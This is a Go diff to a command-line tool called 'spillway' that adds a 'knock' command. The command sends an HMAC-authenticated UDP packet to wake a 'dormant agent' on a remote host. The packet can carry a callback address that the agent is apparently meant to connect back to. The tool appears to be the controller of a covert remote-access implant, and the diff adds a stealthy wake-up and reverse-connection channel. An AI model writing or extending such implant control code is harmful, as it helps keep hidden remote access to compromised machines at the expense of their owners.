@@ -4,9 +4,14 @@ package main
 
 import (
 	"context"
+	"crypto/hmac"
+	"crypto/rand"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/binary"
 	"flag"
 	"fmt"
+	"net"
 	"os"
 	"os/signal"
 	"syscall"
@@ -43,6 +48,7 @@ func printUsage() {
 	fmt.Println("  " + colorMauve + "spillway listen" + colorReset + colorDim + "   [flags]          — wait for agent connections" + colorReset)
 	fmt.Println("  " + colorMauve + "spillway connect" + colorReset + colorDim + "  HOST:PORT [flags] — connect to agent" + colorReset)
 	fmt.Println("  " + colorMauve + "spillway status" + colorReset + colorDim + "                    — show session info" + colorReset)
+	fmt.Println("  " + colorMauve + "spillway knock" + colorReset + colorDim + "   HOST [flags]      — send knock to dormant agent" + colorReset)
 	fmt.Println("  " + colorMauve + "spillway unmount" + colorReset + colorDim + "  MOUNTPOINT        — unmount a session" + colorReset)
 	fmt.Println("  " + colorMauve + "spillway version" + colorReset + colorDim + "                   — show version info" + colorReset)
 	fmt.Println()
@@ -58,6 +64,11 @@ func printUsage() {
 	fmt.Println("  " + colorTeal + "-m, --mount" + colorReset + "     mount point (default ./mnt)")
 	fmt.Println("  " + colorTeal + "-k, --key" + colorReset + "       pre-shared key (base64)")
 	fmt.Println("  " + colorTeal + "-r, --read-only" + colorReset + " mount read-only")
+	fmt.Println()
+	fmt.Println(colorText + "Flags (knock):" + colorReset)
+	fmt.Println("  " + colorTeal + "-p, --port" + colorReset + "      UDP knock port (default 49152)")
+	fmt.Println("  " + colorTeal + "-k, --key" + colorReset + "       pre-shared key (base64)")
+	fmt.Println("  " + colorTeal + "--callback" + colorReset + "      callback HOST:PORT override")
 }
 
 // runAgent is a stub in the !agent build. cfgMode is always "" here so this
@@ -78,6 +89,8 @@ func runListener() error {
 		return cmdListen(os.Args[2:])
 	case "connect":
 		return cmdConnect(os.Args[2:])
+	case "knock":
+		return cmdKnock(os.Args[2:])
 	case "status":
 		return cmdStatus()
 	case "unmount":
@@ -222,6 +235,107 @@ func cmdUnmount(args []string) error {
 	}
 
 	fmt.Printf("%s[+]%s Unmounted %s%s%s\n", colorGreen, colorReset, colorMauve, mountpoint, colorReset)
+	return nil
+}
+
+func cmdKnock(args []string) error {
+	fs := flag.NewFlagSet("knock", flag.ContinueOnError)
+
+	var port int
+	var pskB64, callback string
+
+	fs.IntVar(&port, "port", 49152, "UDP knock port")
+	fs.IntVar(&port, "p", 49152, "UDP knock port (shorthand)")
+	fs.StringVar(&pskB64, "key", "", "pre-shared key (base64)")
+	fs.StringVar(&pskB64, "k", "", "pre-shared key (base64) (shorthand)")
+	fs.StringVar(&callback, "callback", "", "callback HOST:PORT override")
+
+	if err := fs.Parse(args); err != nil {
+		return err
+	}
+
+	if fs.NArg() < 1 {
+		return fmt.Errorf("knock requires HOST argument")
+	}
+	host := fs.Arg(0)
+
+	if pskB64 == "" {
+		return fmt.Errorf("--key is required (base64-encoded PSK from build output)")
+	}
+	psk, err := decodePSK(pskB64)
+	if err != nil {
+		return fmt.Errorf("invalid PSK: %w", err)
+	}
+
+	// Build knock payload: [4-byte magic] [8-byte nonce] [12-byte HMAC] [optional 6-byte callback]
+	payloadLen := 24
+	var cbBytes []byte
+	if callback != "" {
+		cbHost, cbPortStr, err := net.SplitHostPort(callback)
+		if err != nil {
+			return fmt.Errorf("invalid --callback format (expected HOST:PORT): %w", err)
+		}
+		parsedIP := net.ParseIP(cbHost)
+		if parsedIP == nil {
+			return fmt.Errorf("invalid callback IP: %s", cbHost)
+		}
+		cbIP := parsedIP.To4()
+		if cbIP == nil {
+			return fmt.Errorf("callback IP must be IPv4: %s", cbHost)
+		}
+		cbPortNum, err := net.LookupPort("udp", cbPortStr)
+		if err != nil {
+			return fmt.Errorf("invalid callback port: %w", err)
+		}
+		cbBytes = make([]byte, 6)
+		copy(cbBytes[0:4], cbIP)
+		binary.BigEndian.PutUint16(cbBytes[4:6], uint16(cbPortNum))
+		payloadLen = 30
+	}
+
+	payload := make([]byte, payloadLen)
+
+	// Magic: 0x5349504C
+	binary.BigEndian.PutUint32(payload[0:4], 0x5349504C)
+
+	// Nonce.
+	nonce := payload[4:12]
+	if _, err := rand.Read(nonce); err != nil {
+		return fmt.Errorf("generate nonce: %w", err)
+	}
+
+	// HMAC-SHA256(PSK, nonce), truncated to 96 bits.
+	mac := hmac.New(sha256.New, psk)
+	mac.Write(nonce)
+	copy(payload[12:24], mac.Sum(nil)[:12])
+
+	// Optional callback.
+	if cbBytes != nil {
+		copy(payload[24:30], cbBytes)
+	}
+
+	// Send via UDP.
+	addr := fmt.Sprintf("%s:%d", host, port)
+	conn, err := net.Dial("udp", addr)
+	if err != nil {
+		return fmt.Errorf("dial udp %s: %w", addr, err)
+	}
+	defer conn.Close()
+
+	if _, err := conn.Write(payload); err != nil {
+		return fmt.Errorf("send knock: %w", err)
+	}
+
+	printBanner()
+	fmt.Printf("%s[+]%s Knock sent to %s%s:%d%s (%d bytes)\n",
+		colorGreen, colorReset, colorTeal, host, port, colorReset, len(payload))
+	if callback != "" {
+		fmt.Printf("%s[*]%s Callback override: %s%s%s\n",
+			colorBlue, colorReset, colorMauve, callback, colorReset)
+	}
+	fmt.Printf("%s[*]%s Start your listener to catch the callback.%s\n",
+		colorDim, colorReset, colorReset)
+
 	return nil
 }
 
